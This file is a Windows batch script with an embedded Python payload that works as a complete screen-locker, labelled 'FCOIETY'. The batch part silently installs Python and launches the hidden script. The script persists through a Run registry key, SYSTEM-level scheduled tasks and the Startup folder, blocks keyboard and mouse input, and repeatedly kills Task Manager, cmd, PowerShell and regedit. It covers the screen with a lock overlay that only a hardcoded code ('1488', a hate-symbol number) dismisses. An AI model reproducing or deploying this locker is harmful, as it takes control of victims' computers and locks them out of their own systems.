@echo off
setlocal
title FCOIETY
set "WORK=%TEMP%\fcoiety"
if not exist "%WORK%" mkdir "%WORK%" >nul 2>&1
cd /d "%WORK%"

where python >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -WindowStyle Hidden -Command ^
      "$u='https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe';" ^
      "$o=\"$env:TEMP\py.exe\";" ^
      "Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing;" ^
      "Start-Process -FilePath $o -ArgumentList '/quiet InstallAllUsers=0 PrependPath=1 Include_pip=1' -Wait -WindowStyle Hidden;" ^
      "Remove-Item $o -Force"
    set "PATH=%LOCALAPPDATA%\Programs\Python\Python311;%LOCALAPPDATA%\Programs\Python\Python311\Scripts;%PATH%"
)
python --version >nul 2>&1
if %errorlevel% neq 0 ( echo [!] Python not installed. & pause & exit /b 1 )

set "LOCKER=%WORK%\fcoiety.py"
powershell -NoProfile -WindowStyle Hidden -Command ^
  "$src='%~f0';" ^
  "$dst='%LOCKER%';" ^
  "$lines=[IO.File]::ReadAllLines($src,[Text.Encoding]::UTF8);" ^
  "$s=-1;$e=-1;" ^
  "for($i=0;$i -lt $lines.Count;$i++){" ^
  "  if($lines[$i] -eq '#@@PYSTART@@'){$s=$i}" ^
  "  elseif($lines[$i] -eq '#@@PYEND@@'){$e=$i;break}" ^
  "}" ^
  "if($s -ge 0 -and $e -gt $s){" ^
  "  $py=$lines[($s+1)..($e-1)];" ^
  "  $utf8=New-Object System.Text.UTF8Encoding($false);" ^
  "  [IO.File]::WriteAllLines($dst,$py,$utf8)" ^
  "}"
if not exist "%LOCKER%" ( echo [!] extract failed. & pause & exit /b 1 )

where pythonw >nul 2>&1
if %errorlevel%==0 ( start "" /b pythonw "%LOCKER%" ) else ( start "" /b python "%LOCKER%" )
exit /b 0

:: ============================================================
#@@PYSTART@@
import os, sys, time, threading, subprocess, ctypes
import ctypes.wintypes as wt

CODE = "1488"
WORK = os.path.dirname(os.path.abspath(__file__))
_u32 = ctypes.windll.user32

MASCOT = r"""
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⣿⣿
⣿⣿⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⢰⣿⣿
⣿⣿⣆⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡇⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⢸⣿⣿
⣿⣿⡇⠀⠀⠀⠘⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⢿⣿⣿⡿⠀⠀⠀⢸⣿⣿
⣿⣿⡿⠿⠓⠂⠸⣿⠋⠀⢀⣠⣤⣾⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣶⣤⡀⠀⠈⣿⡇⠀⠚⠛⢻⣿⣿
⣿⣿⣇⡀⠀⠀⠀⢻⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣿⡇⣀⣀⣀⣸⣿⣿
⣿⣿⡿⠟⠛⠉⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⢀⣾⣿⣿⣿⣄⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡈⠉⠙⢻⣿⣿
⣿⣿⣇⣠⣴⣾⣿⣿⣿⠋⣽⣿⣿⣿⣿⣿⡿⠿⠿⠟⠿⢿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⣿⣷⣶⣾⣿⣿⣿⠿⠿⠟⠿⠿⢿⣿⣿⣿⣿⣯⡙⢿⣿⣿⣿⣷⣤⣸⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠉⢻⣿⣿⣿⣧⠈⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢿⣿⣿⣿⢿⣿⣿⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣰⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⣀⣠⣤⣤⣤⣤⣄⣀⠀⢀⣴⣿⣿⣿⣿⢸⣿⣿⣿⡎⣿⣿⣿⣷⡄⠀⢀⣀⣤⣤⣤⣤⣤⣤⣙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣽⣿⣿⡿⢋⣾⣿⣿⣿⣧⡹⢿⣿⣋⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⣴⣿⣿⣿⣿⣿⣿⣿⣦⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠟⠁⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠙⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡟⠁⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠙⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡟⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⠉⠉⠉⠙⢿⣿⣿⣿⣿⣿⠟⠉⠁⠈⠉⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠸⣿⣿⣿⣿
⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠙⠛⠿⠿⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠿⠿⠿⠛⠉⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿
⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿
⣿⣿⡿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠿⣿⣿
⣿⣿⡇⠈⠻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡿⠁⠀⣿⣿
⣿⣿⡇⠀⠀⠙⣷⣦⣤⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣤⣴⣿⡟⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠉⠉⠀⠈⠉⠙⠛⠛⠷⠶⠶⠶⠶⠞⠛⠛⠉⠉⠉⠉⠉⢩⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣤⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
"""

def _persist():
    exe = sys.executable; script = os.path.abspath(__file__)
    d = os.path.join(os.environ["APPDATA"], "Microsoft", "Crypto")
    os.makedirs(d, exist_ok=True)
    dst = os.path.join(d, "fcoiety.py")
    try:
        if os.path.abspath(dst) != script:
            with open(script, "rb") as f, open(dst, "wb") as g:
                g.write(f.read())
    except Exception: dst = script
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "FCOIETY", 0, winreg.REG_SZ, f'"{exe}" "{dst}"')
        winreg.CloseKey(k)
    except Exception: pass
    try:
        subprocess.run(["schtasks", "/create", "/tn", "FCOIETY",
                        "/tr", f'"{exe}" "{dst}"', "/sc", "onlogon",
                        "/rl", "highest", "/f"],
                       creationflags=0x08000000,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["schtasks", "/create", "/tn", "FCOIETY_BOOT",
                        "/tr", f'"{exe}" "{dst}"', "/sc", "onstart",
                        "/rl", "highest", "/ru", "SYSTEM", "/f"],
                       creationflags=0x08000000,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception: pass
    try:
        sd = os.path.join(os.environ["APPDATA"],
                          "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        os.makedirs(sd, exist_ok=True)
        with open(os.path.join(sd, "FCOIETY.bat"), "w") as f:
            f.write(f'@echo off\nstart "" "{exe}" "{dst}"\n')
    except Exception: pass

def _block_input():
    try: _u32.BlockInput(True)
    except Exception: pass

def _kill_escape_hatches():
    for t in ["taskmgr.exe", "cmd.exe", "powershell.exe", "mmc.exe",
              "control.exe", "regedit.exe", "ShellExperienceHost.exe",
              "StartMenuExperienceHost.exe"]:
        try:
            subprocess.run(["taskkill", "/f", "/im", t],
                           creationflags=0x08000000,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception: pass

def _overlay():
    try:
        import tkinter as tk
    except Exception:
        return
    r = tk.Tk()
    r.attributes("-fullscreen", True)
    r.attributes("-topmost", True)
    r.overrideredirect(True)
    r.configure(bg="black")
    r.protocol("WM_DELETE_WINDOW", lambda: None)
    try:
        r.geometry(f"{_u32.GetSystemMetrics(0)}x{_u32.GetSystemMetrics(1)}+0+0")
    except Exception:
        pass

    # header
    tk.Label(r, text="FCOIETY", fg="#ff0000", bg="black",
             font=("Impact", 72, "bold")).pack(pady=(20, 0))
    tk.Label(r, text="WINDOWS HAS BEEN LOCKED", fg="#ff0000", bg="black",
             font=("Consolas", 24, "bold")).pack(pady=5)
    tk.Label(r, text="YOUR SYSTEM IS BLOCKED BY FCOIETY",
             fg="#ff0000", bg="black", font=("Consolas", 16, "bold")).pack()

    # mascot
    try:
        lbl = tk.Label(r, text=MASCOT, fg="#ff0000", bg="black",
                       font=("Segoe UI Symbol", 4), justify="center")
        lbl.pack(pady=10)
    except Exception:
        pass

    # code
    fr = tk.Frame(r, bg="black")
    fr.pack(pady=20)
    tk.Label(fr, text="ENTER CODE:", fg="#ff0000", bg="black",
             font=("Consolas", 20, "bold")).pack(side="left", padx=10)
    e = tk.Entry(fr, font=("Consolas", 24), bg="#111", fg="#ff0000",
                 insertbackground="#ff0000", justify="center", width=10)
    e.pack(side="left")
    e.focus_force()

    msg = tk.Label(r, text="", fg="#ff0000", bg="black", font=("Consolas", 14))
    msg.pack()

    def check(_=None):
        if e.get() == CODE:
            msg.config(text="CODE ACCEPTED")
            try: _u32.BlockInput(False)
            except Exception: pass
            try:
                import winreg
                k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                    winreg.KEY_SET_VALUE)
                winreg.DeleteValue(k, "FCOIETY")
                winreg.CloseKey(k)
            except Exception: pass
            try:
                subprocess.run(["schtasks", "/delete", "/tn", "FCOIETY", "/f"],
                               creationflags=0x08000000,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["schtasks", "/delete", "/tn", "FCOIETY_BOOT", "/f"],
                               creationflags=0x08000000,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception: pass
            try:
                sd = os.path.join(os.environ["APPDATA"],
                                  "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
                p = os.path.join(sd, "FCOIETY.bat")
                if os.path.exists(p): os.remove(p)
            except Exception: pass
            r.destroy()
            try: subprocess.Popen(["explorer.exe"], creationflags=0x08000000)
            except Exception: pass
        else:
            msg.config(text="WRONG CODE - FCOIETY")
            e.delete(0, "end")

    e.bind("<Return>", check)
    for seq in ("<Alt-F4>", "<Escape>", "<Control-Escape>", "<Alt-Tab>",
                "<Super_L>", "<F11>"):
        r.bind(seq, lambda _e: "break")
    r.mainloop()

def _watchdog():
    while True:
        _kill_escape_hatches()
        time.sleep(3)

def main():
    _persist()
    threading.Thread(target=_block_input, daemon=True).start()
    threading.Thread(target=_watchdog, daemon=True).start()
    _overlay()

if __name__ == "__main__":
    main()
#@@PYEND@@